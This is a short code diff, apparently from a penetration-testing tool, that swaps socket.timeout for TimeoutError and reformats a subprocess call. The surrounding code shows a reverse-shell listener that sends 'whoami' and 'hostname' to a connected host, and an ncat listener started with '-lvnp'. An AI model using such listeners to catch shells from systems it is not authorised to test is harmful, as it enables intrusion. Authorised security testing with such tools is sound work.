@@ -58,7 +58,7 @@ class ReverseShellListener:
             while not self._stop.is_set():
                 try:
                     conn, addr = sock.accept()
-                except socket.timeout:
+                except TimeoutError:
                     continue
                 except OSError:
                     break
@@ -82,13 +82,13 @@ class ReverseShellListener:
             chunks: list[str] = []
             try:
                 chunks.append(conn.recv(4096).decode("utf-8", errors="replace"))
-            except socket.timeout:
+            except TimeoutError:
                 pass
             for cmd in (b"whoami\r\n", b"hostname\r\n"):
                 try:
                     conn.send(cmd)
                     chunks.append(conn.recv(4096).decode("utf-8", errors="replace"))
-                except (socket.timeout, OSError):
+                except (TimeoutError, OSError):
                     break
             self.capture.output = "".join(chunks).strip()
         except OSError as exc:
@@ -125,7 +125,9 @@ class NcatListener:
         else:
             cmd = [ncat, "-lvnp", str(self.port)]
         print_info(f"listener: {' '.join(cmd)}")
-        self._proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        self._proc = subprocess.Popen(
+            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+        )
 
     def wait(self, timeout: float) -> ShellCapture:
         if not self._proc or not self._proc.stdout:
